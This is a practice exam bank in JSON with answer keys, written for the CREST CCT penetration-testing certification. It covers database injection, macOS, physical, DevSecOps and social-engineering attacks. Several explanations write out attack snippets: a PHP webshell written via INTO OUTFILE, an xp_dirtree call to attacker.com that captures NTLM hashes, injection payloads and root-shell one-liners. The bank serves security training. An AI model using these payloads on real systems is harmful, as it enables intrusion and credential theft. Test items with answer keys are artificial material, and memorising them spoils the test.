@@ -1,0 +1,388 @@
+{
+  "title": "CREST CCT \u2014 Databases, macOS, Physical, SecDevOps & Social Engineering",
+  "description": "Covers Databases (PT009), macOS Security Assessment (PT020), Physical Security (PT014), Secure Development Operations (PT015), and Social Engineering (PT019) domains of the CREST CCT examination.",
+  "based_on": "CREST CCT",
+  "created_by": "Claude (Anthropic)",
+  "difficulty": "HARD",
+  "pass_mark": 70,
+  "time_limit": 90,
+  "num_questions": 40,
+  "links": [
+    {"label": "CREST CCT Syllabus", "url": "https://www.crest-approved.org/membership/crest-certified-tester/"}
+  ],
+  "questions": [
+    {
+      "category": "Databases (PT009)",
+      "question": "A web application returns different error messages based on whether a SQL condition is true or false, but does not display data. Which SQL injection technique is most appropriate?",
+      "options": {"A": "UNION-based injection", "B": "Error-based injection", "C": "Boolean-based blind injection", "D": "Out-of-band injection"},
+      "correct": "C",
+      "explanation": "Boolean-based blind SQL injection infers data by asking true/false questions (e.g., 'Is the first character of the admin password greater than M?') and observing different application responses. It requires no direct data output but needs at least two distinguishable response states."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which MSSQL stored procedure, when enabled, allows an attacker with DBA privileges to execute operating system commands?",
+      "options": {"A": "sp_OACreate", "B": "xp_cmdshell", "C": "sp_executesql", "D": "xp_dirtree"},
+      "correct": "B",
+      "explanation": "xp_cmdshell is an extended stored procedure in MSSQL that executes shell commands on the host OS as the SQL Server service account. It is disabled by default but can be enabled with RECONFIGURE if the attacker has sysadmin privileges."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "An attacker uses the MSSQL function xp_dirtree with an attacker-controlled UNC path (e.g., xp_dirtree '\\\\attacker.com\\share'). What credential is captured?",
+      "options": {
+        "A": "The Windows domain user currently running the SQL query",
+        "B": "The MSSQL sa (system administrator) account hash",
+        "C": "The NTLMv2 hash of the SQL Server service account, captured by Responder on the attacker's machine",
+        "D": "The Kerberos TGT of the database server's machine account"
+      },
+      "correct": "C",
+      "explanation": "xp_dirtree causes the SQL Server process to attempt to connect to the UNC path, triggering an NTLMv2 authentication attempt. An attacker running Responder on the target host captures the SQL Server service account's NTLMv2 hash for offline cracking."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which MySQL feature allows writing query results directly to a file on the server filesystem, potentially enabling code execution?",
+      "options": {
+        "A": "LOAD DATA INFILE",
+        "B": "SELECT ... INTO OUTFILE",
+        "C": "EXECUTE PROCEDURE",
+        "D": "CREATE EVENT"
+      },
+      "correct": "B",
+      "explanation": "SELECT ... INTO OUTFILE writes query output to a file on the server. If the MySQL service has write access to the web root, an attacker can write a PHP webshell (e.g., SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php')."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which PostgreSQL feature can be abused to execute OS commands if the database user has SUPERUSER privileges?",
+      "options": {
+        "A": "pg_read_file()",
+        "B": "COPY TO/FROM PROGRAM",
+        "C": "CREATE LANGUAGE plpgsql",
+        "D": "dblink extension"
+      },
+      "correct": "B",
+      "explanation": "PostgreSQL's COPY command with the PROGRAM option (e.g., COPY t FROM PROGRAM 'id') executes a shell command on the server and reads its output. This requires SUPERUSER privilege and is a powerful OS command execution primitive."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "A tester submits the payload ' OR '1'='1 into a login form and gains access. What type of SQL injection is this?",
+      "options": {"A": "Second-order injection", "B": "UNION-based injection", "C": "Authentication bypass via tautology", "D": "Time-based blind injection"},
+      "correct": "C",
+      "explanation": "The payload creates a tautology — '1'='1' is always true — causing the WHERE clause to return all rows, bypassing the password check. This is a classic in-band SQL injection for authentication bypass."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which sqlmap flag instructs it to attempt OS command execution if a stacked queries injection is found in a MSSQL database?",
+      "options": {
+        "A": "--dump-all",
+        "B": "--os-shell",
+        "C": "--technique=T",
+        "D": "--sql-query"
+      },
+      "correct": "B",
+      "explanation": "sqlmap's --os-shell flag attempts to obtain an interactive OS shell by chaining SQL injection with database-specific OS execution methods (e.g., xp_cmdshell for MSSQL, COPY FROM PROGRAM for PostgreSQL, UDFs for MySQL)."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which NoSQL injection payload targets MongoDB's $where operator to bypass authentication?",
+      "options": {
+        "A": "' OR 1=1--",
+        "B": "{\"$where\": \"this.password.match(/.*/)\"}",
+        "C": "1; DROP TABLE users;--",
+        "D": "' UNION SELECT username,password FROM users--"
+      },
+      "correct": "B",
+      "explanation": "MongoDB's $where operator executes JavaScript server-side. The payload .match(/.*/) matches any string, returning all documents. Modern MongoDB versions disable $where by default; the more common NoSQL injection uses operator injection like {\"password\": {\"$gt\": \"\"}}."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "An attacker finds a web application that uses parameterised queries for all inputs. Which SQL injection technique might still work?",
+      "options": {
+        "A": "First-order (classic) SQL injection",
+        "B": "Second-order (stored) SQL injection if user-controlled data is stored and later used unsafely in a dynamic SQL statement",
+        "C": "Boolean-based blind injection via HTTP headers",
+        "D": "UNION-based injection via the User-Agent header"
+      },
+      "correct": "B",
+      "explanation": "Second-order SQL injection occurs when user input is safely stored (e.g., in a username field), but later retrieved and concatenated into a dynamic SQL query without proper sanitisation. The parameterisation of the initial INSERT doesn't protect the subsequent SELECT."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "Which Oracle database attack vector uses HTTP requests from the database server to internal network services, enabling SSRF?",
+      "options": {"A": "UTL_FILE", "B": "UTL_HTTP", "C": "DBMS_SCHEDULER", "D": "DBMS_PIPE"},
+      "correct": "B",
+      "explanation": "Oracle's UTL_HTTP package allows the database to make outbound HTTP requests. An attacker with execute permissions can use it to probe internal services, exfiltrate data via DNS/HTTP, or perform SSRF attacks against cloud metadata endpoints."
+    },
+    {
+      "category": "Databases (PT009)",
+      "question": "What is the purpose of parameterised queries (prepared statements) in preventing SQL injection?",
+      "options": {
+        "A": "They encrypt the SQL query before sending it to the database",
+        "B": "They separate SQL code from data by pre-compiling the query structure, so user input is always treated as a literal value and cannot alter the query logic",
+        "C": "They validate user input against a whitelist of allowed characters",
+        "D": "They run queries in a sandboxed context that prevents access to sensitive tables"
+      },
+      "correct": "B",
+      "explanation": "Parameterised queries pre-compile the SQL structure and pass user input as typed parameters, ensuring the database treats the input as data rather than SQL code. Even a SQL injection payload like ' OR '1'='1 is treated as a literal string."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "What does SIP (System Integrity Protection) prevent on macOS, even for root users?",
+      "options": {
+        "A": "Running unsigned applications downloaded from the internet",
+        "B": "Modifying protected system directories (/System, /usr, /bin, /sbin), loading unsigned kernel extensions, and attaching debuggers to system processes",
+        "C": "Accessing user keychain data without explicit permission",
+        "D": "Executing scripts without notarisation approval"
+      },
+      "correct": "B",
+      "explanation": "SIP (rootless mode) restricts modifications to protected OS paths and operations even for the root user. It can only be disabled by booting into Recovery Mode, making it a significant barrier against persistent malware even after root compromise."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Which macOS persistence mechanism runs as the logged-in user and is stored in ~/Library/LaunchAgents as a .plist file?",
+      "options": {"A": "LaunchDaemon", "B": "LaunchAgent", "C": "Login Item", "D": "cron job"},
+      "correct": "B",
+      "explanation": "LaunchAgents in ~/Library/LaunchAgents run as the current user when they log in. LaunchDaemons in /Library/LaunchDaemons run as root at system boot. Both are persistent across reboots, making them popular malware persistence mechanisms."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "An attacker exploits DYLD_INSERT_LIBRARIES on macOS. What does this achieve?",
+      "options": {
+        "A": "Replaces the default shell to maintain persistence",
+        "B": "Forces a target executable to load a malicious dylib at startup, enabling code injection",
+        "C": "Bypasses Gatekeeper by modifying the quarantine extended attribute",
+        "D": "Extracts keychain data by hooking macOS security APIs"
+      },
+      "correct": "B",
+      "explanation": "DYLD_INSERT_LIBRARIES is a macOS dynamic linker environment variable that forces the loading of specified dylibs into any process. This enables dylib injection for privilege escalation or code execution, though it is blocked for processes with the setuid/setgid bit and hardened runtime."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Which macOS security framework controls applications' access to sensitive resources such as the camera, microphone, contacts, and calendar, requiring explicit user consent?",
+      "options": {"A": "Gatekeeper", "B": "SIP", "C": "TCC (Transparency, Consent, and Control)", "D": "XProtect"},
+      "correct": "C",
+      "explanation": "TCC manages permissions for sensitive resources by maintaining a database of user consent decisions. Attackers may attempt to abuse TCC by injecting code into processes that already have TCC permissions, or by directly modifying the TCC database (if SIP is disabled)."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Which macOS tool is equivalent to running Mimikatz on Windows, allowing extraction of passwords from the macOS Keychain?",
+      "options": {"A": "osquery", "B": "chainbreaker", "C": "SwiftBelt", "D": "system_profiler"},
+      "correct": "B",
+      "explanation": "Chainbreaker is a macOS keychain forensics tool that can extract passwords, keys, and certificates from the macOS Keychain database files. The security command-line tool can also access keychain items if the keychain is unlocked."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Gatekeeper on macOS enforces which primary security control on downloaded applications?",
+      "options": {
+        "A": "All applications must be compiled with Address Space Layout Randomization",
+        "B": "Applications must be signed with a valid Apple Developer certificate and notarised by Apple before they can run",
+        "C": "Applications cannot access the network without explicit firewall approval",
+        "D": "Applications must be installed via the Mac App Store"
+      },
+      "correct": "B",
+      "explanation": "Gatekeeper requires that applications are signed with a valid Apple Developer ID and have been notarised (scanned by Apple's automated security checks). It blocks unsigned or unnotarised applications unless the user explicitly overrides the warning."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Which macOS privilege escalation technique exploits a misconfigured sudo rule where a user can run a specific binary as root?",
+      "options": {
+        "A": "DYLD_INSERT_LIBRARIES injection into a setuid binary",
+        "B": "GTFOBins-style abuse of the allowed sudo binary (e.g., using vim, find, or python to execute a shell as root)",
+        "C": "Modifying the LaunchDaemon plist for the target service",
+        "D": "Exploiting a race condition in the sudo authentication prompt"
+      },
+      "correct": "B",
+      "explanation": "If a sudo rule allows a user to run a binary like vim, python, or find as root, GTFOBins-style techniques can spawn a root shell from within that binary (e.g., :!bash in vim, or import os; os.system('/bin/bash') in python)."
+    },
+    {
+      "category": "macOS Security Assessment (PT020)",
+      "question": "Which macOS directory can be abused for dylib hijacking if an application searches for dylibs in a user-writable location before the system library path?",
+      "options": {
+        "A": "/usr/lib/",
+        "B": "/Library/Application Support/",
+        "C": "A user-writable Rpath directory listed before system paths in the binary's @rpath",
+        "D": "/System/Library/Frameworks/"
+      },
+      "correct": "C",
+      "explanation": "macOS dylib hijacking exploits @rpath, @loader_path, or @executable_path resolution order. If an application has a writable directory in its @rpath search order before system directories, placing a malicious dylib there causes the application to load it instead of the legitimate library."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "Which physical security attack involves following an authorised person through a controlled access point without presenting credentials?",
+      "options": {"A": "Piggybacking", "B": "Tailgating", "C": "Impersonation", "D": "Bypass"},
+      "correct": "B",
+      "explanation": "Tailgating is following someone through a secure door without their knowledge or consent. Piggybacking is similar but the authorised person is aware and complicit (e.g., holding the door open). Both bypass physical access controls."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "A physical penetration tester uses a Proxmark3 device near an employee. What are they attempting?",
+      "options": {
+        "A": "Jamming the building's wireless communications",
+        "B": "Cloning the employee's RFID access card by reading it without contact",
+        "C": "Capturing the employee's mobile phone's Bluetooth pairing keys",
+        "D": "Replaying recorded entry codes from a keypad"
+      },
+      "correct": "B",
+      "explanation": "The Proxmark3 is an RFID/NFC research tool capable of reading, cloning, and emulating various RFID card formats (HID, EM4100, Mifare Classic, etc.) at close range. Attackers can covertly read a card in a pocket or bag and clone it onto a blank card."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "Which lock-picking technique uses a modified pick with a serrated edge that is rapidly raked back and forth to set multiple pins simultaneously?",
+      "options": {"A": "Single Pin Picking (SPP)", "B": "Bumping", "C": "Raking", "D": "Shimming"},
+      "correct": "C",
+      "explanation": "Raking uses a serrated pick (rake) rapidly moved in and out while applying rotational tension, setting multiple pins by chance rather than precisely. It is faster but less reliable than Single Pin Picking (SPP), which sets each pin individually."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "A man-trap (airlock) is designed to prevent tailgating. Which attack bypasses it most effectively?",
+      "options": {
+        "A": "Lock picking the first door before the second closes",
+        "B": "Social engineering the security guard controlling manual override, or exploiting anti-passback configuration errors",
+        "C": "Jamming the magnetic lock sensor",
+        "D": "Replaying a valid RFID credential captured externally"
+      },
+      "correct": "B",
+      "explanation": "Man-traps prevent tailgating by ensuring only one person passes at a time, often with a guard or automated controls. Social engineering the guard (e.g., posing as maintenance staff needing urgent access) or exploiting anti-passback misconfiguration (using the same credential twice) are realistic bypasses."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "During a physical assessment, a tester delivers USB drives labeled 'PAYROLL Q4' to a company car park. What attack is this?",
+      "options": {"A": "Vishing", "B": "Baiting", "C": "Pretexting", "D": "Spear-phishing"},
+      "correct": "B",
+      "explanation": "Baiting involves leaving malicious physical media (USB drives, CDs) in locations where targets will find and use them out of curiosity. Labelling them with enticing titles increases the likelihood of an employee plugging them in on a corporate network."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "Which technique does a physical pen tester use to open a door latch through the gap between a door and its frame using a thin flexible tool?",
+      "options": {"A": "Bumping", "B": "Shimming", "C": "Loiding (carding)", "D": "Bypass with a shim"},
+      "correct": "C",
+      "explanation": "Loiding (or carding) uses a thin flexible tool (credit card, shim) inserted into the gap between a door and its frame to push back a spring latch bolt. It only works on spring latches (not deadbolts) and is a quick non-destructive entry method."
+    },
+    {
+      "category": "Physical Security (PT014)",
+      "question": "Which proximity card technology used widely in enterprise access control systems communicates at 125 kHz and is considered insecure due to no encryption or mutual authentication?",
+      "options": {"A": "Mifare Classic (ISO 14443)", "B": "HID iCLASS SE", "C": "EM4100 / HID Prox (125 kHz)", "D": "FIDO2 / WebAuthn"},
+      "correct": "C",
+      "explanation": "HID Prox (125 kHz) and EM4100 cards transmit their card number in plaintext with no encryption or mutual authentication, making them trivially clonable with tools like the Proxmark3. Modern replacements like iCLASS SE and Seos implement encryption."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "What is the key difference between SAST (Static Application Security Testing) and DAST (Dynamic Application Security Testing)?",
+      "options": {
+        "A": "SAST tests compiled binaries while DAST tests source code",
+        "B": "SAST analyses source code without executing it; DAST tests the running application by sending inputs and observing outputs",
+        "C": "SAST is manual code review while DAST is automated scanning",
+        "D": "SAST only detects injection flaws while DAST detects logic errors"
+      },
+      "correct": "B",
+      "explanation": "SAST (white-box) analyses source code, bytecode, or binaries without execution, finding issues like hardcoded secrets and injection vulnerabilities early in development. DAST (black-box) sends inputs to the running application, discovering runtime issues like authentication bypass and injection."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "A developer commits a file containing AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE to a public GitHub repository. Which tool is specifically designed to detect this type of secret exposure in git history?",
+      "options": {"A": "Trivy", "B": "Checkov", "C": "truffleHog / gitleaks", "D": "Snyk"},
+      "correct": "C",
+      "explanation": "truffleHog and gitleaks scan git repositories (including full commit history) for secrets like API keys, passwords, and private keys using entropy analysis and regex patterns. They can detect secrets that were previously committed and then removed."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "Which threat modelling methodology uses the acronym STRIDE to categorise threats?",
+      "options": {
+        "A": "Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege",
+        "B": "SQL injection, Traversal, Remote code execution, Identity theft, Data exfiltration, Escalation",
+        "C": "Sniffing, Timing, Replay, Integrity bypass, DDoS, Exploit",
+        "D": "Session hijacking, Token forgery, Rootkit, Input validation, DoS, Enumeration"
+      },
+      "correct": "A",
+      "explanation": "STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) was developed by Microsoft to categorise threats against software systems, providing a structured approach to identifying security risks during design."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "A malicious npm package named 'lodahs' mimics the popular 'lodash' library. What type of supply chain attack is this?",
+      "options": {"A": "Dependency confusion", "B": "Typosquatting", "C": "Brandjacking", "D": "Repo-jacking"},
+      "correct": "B",
+      "explanation": "Typosquatting registers package names that are common typos of popular packages, hoping developers will accidentally install them. 'lodahs' vs 'lodash' is a classic example. These malicious packages typically contain credential-stealing or backdoor code."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "What is a dependency confusion (namespace confusion) attack?",
+      "options": {
+        "A": "Publishing a malicious package with the same name as an internal private package to a public registry, causing package managers to download the public (malicious) version",
+        "B": "Creating a typo of a popular public package to trick developers",
+        "C": "Compromising the maintainer account of a legitimate package",
+        "D": "Injecting malicious code into a pull request to an open-source dependency"
+      },
+      "correct": "A",
+      "explanation": "Dependency confusion exploits the fact that many package managers (npm, pip, gem) prefer public registry packages over private ones when the same name exists. An attacker publishes a public package with the same name as a company's internal package with a higher version number, causing automatic installation."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "Which IaC security scanning tool checks Terraform and CloudFormation templates for misconfigurations such as overly permissive S3 buckets or unencrypted resources?",
+      "options": {"A": "Trivy", "B": "Checkov", "C": "Snyk", "D": "Semgrep"},
+      "correct": "B",
+      "explanation": "Checkov is an open-source IaC static analysis tool that scans Terraform, CloudFormation, Kubernetes manifests, and ARM templates for security and compliance misconfigurations against CIS benchmarks and cloud security best practices."
+    },
+    {
+      "category": "Secure Development Operations (PT015)",
+      "question": "During a CI/CD pipeline security review, an attacker finds that a GitHub Actions workflow triggers on 'pull_request_target' and checks out the PR branch. Why is this dangerous?",
+      "options": {
+        "A": "It allows any contributor to view private environment variables",
+        "B": "pull_request_target runs with write repository permissions and access to secrets; checking out untrusted PR code and running it can expose secrets to the attacker's fork",
+        "C": "The pull_request_target event bypasses branch protection rules",
+        "D": "It creates a GitHub token with admin permissions by default"
+      },
+      "correct": "B",
+      "explanation": "pull_request_target runs in the context of the base repository with write permissions and access to secrets (unlike pull_request which runs with read-only access). If it checks out and executes code from the PR branch, an attacker can steal repository secrets by crafting a malicious PR."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "Which social engineering technique involves calling a target and impersonating a figure of authority (e.g., IT helpdesk, bank) to extract sensitive information?",
+      "options": {"A": "Phishing", "B": "Smishing", "C": "Vishing", "D": "Pretexting"},
+      "correct": "C",
+      "explanation": "Vishing (voice phishing) uses phone calls with a fabricated scenario (pretext) to manipulate targets into revealing credentials, OTP codes, or sensitive data. Caller ID spoofing makes the call appear to originate from a trusted number."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "An attacker sends an email appearing to come from the CEO asking the CFO to urgently transfer funds to a new supplier account. What is this attack called?",
+      "options": {"A": "Spear-phishing", "B": "Business Email Compromise (BEC) / Whaling", "C": "Clone phishing", "D": "Smishing"},
+      "correct": "B",
+      "explanation": "This is Business Email Compromise (BEC) targeting a high-value executive (CFO), also called 'whaling' when targeting C-level executives. It exploits urgency and authority to bypass normal approval processes, resulting in fraudulent wire transfers."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "Which OSINT tool is primarily used to map relationships between organisations, people, email addresses, and domains using a visual graph interface?",
+      "options": {"A": "theHarvester", "B": "Shodan", "C": "Maltego", "D": "Recon-ng"},
+      "correct": "C",
+      "explanation": "Maltego is an OSINT platform that visualises relationships between entities (people, organisations, domains, IPs, email addresses) using a graph-based interface. It uses 'transforms' to query various data sources and build intelligence graphs."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "What is the primary purpose of OSINT (Open Source Intelligence) gathering in the context of a social engineering engagement?",
+      "options": {
+        "A": "To identify technical vulnerabilities in the target's network infrastructure",
+        "B": "To collect publicly available information about targets (employees, organisational structure, technology stack) to craft convincing pretexts",
+        "C": "To enumerate the target's Active Directory structure via LDAP",
+        "D": "To identify unpatched software versions using Shodan"
+      },
+      "correct": "B",
+      "explanation": "OSINT for social engineering focuses on gathering employee names, roles, email formats, recent news, technology stacks, and organisational details from sources like LinkedIn, company websites, and job postings to build credible pretexts for phishing and vishing attacks."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "Which psychological principle does an attacker exploit when they create a fake 'only 2 spots left — act now' scenario in a phishing email?",
+      "options": {"A": "Social proof", "B": "Authority", "C": "Scarcity / urgency", "D": "Reciprocity"},
+      "correct": "C",
+      "explanation": "Scarcity and urgency are Cialdini principles of influence. Creating artificial time pressure or limited availability reduces victims' critical thinking and pushes them to act quickly without verifying the legitimacy of the request — a core technique in phishing attacks."
+    },
+    {
+      "category": "Social Engineering (PT019)",
+      "question": "A social engineering tester calls a company's IT helpdesk and claims to be a new employee who cannot access their account. They then ask for a password reset. What countermeasure should the helpdesk use?",
+      "options": {
+        "A": "Ask for the employee's date of birth",
+        "B": "Verify identity through an out-of-band channel (e.g., callback to the employee's manager or pre-registered phone number) and require a ticket number",
+        "C": "Ask them to describe their department's function",
+        "D": "Only grant access during business hours"
+      },
+      "correct": "B",
+      "explanation": "Robust identity verification requires out-of-band confirmation through a separate pre-established channel. Calling back a verified phone number or requiring manager authorisation prevents attackers from obtaining account access through impersonation over a single communication channel."
+    }
+  ]
+}
